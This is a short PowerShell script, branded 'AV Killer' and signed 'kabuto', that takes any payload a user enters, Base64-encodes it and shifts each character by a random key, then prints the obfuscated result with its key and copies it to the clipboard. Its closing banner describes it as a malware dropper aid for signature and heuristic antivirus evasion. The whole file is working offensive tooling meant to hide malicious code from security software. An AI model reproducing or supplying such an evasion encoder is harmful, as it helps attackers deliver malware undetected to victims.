clear-host
write-host " █████╗ ██╗   ██╗    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
██╔══██╗██║   ██║    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
███████║██║   ██║    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
██╔══██║╚██╗ ██╔╝    ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
██║  ██║ ╚████╔╝     ██║  ██╗██║███████╗███████╗███████╗██║  ██║
╚═╝  ╚═╝  ╚═══╝      ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
Coded by kabuto"


$string = read-host -prompt "payload"  
[String]$key = 0..50000 | get-random
$string = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
$string = [Text.Encoding]::ASCII.GetBytes($string) 
Remove-variable -name payload -ErrorAction SilentlyContinue 
for (([String[]]$payload = $string), ($i = 0); $i -lt $string.Length; $i++) {
    $payload[$i] = [int]$string[$i] + $key
    $payload[$i] = [char][int]$payload[$i]  
}
for (($output = ""), ($i = 0); $i -lt $string.length; $i++) {
    $output = $output + $payload[$i] 
}


write-host "payload: "$output
write-host "Key: "$key   

set-clipboard $output 


###################
###################
##               ##
##               ##
## AV Killer(tm) ##
##  Mal Dropper  ##
##               ##
##               ##
##   Signature   ##
##       &       ##
##   Heuristic   ##
##    Evasion    ##
##               ##
###################
###################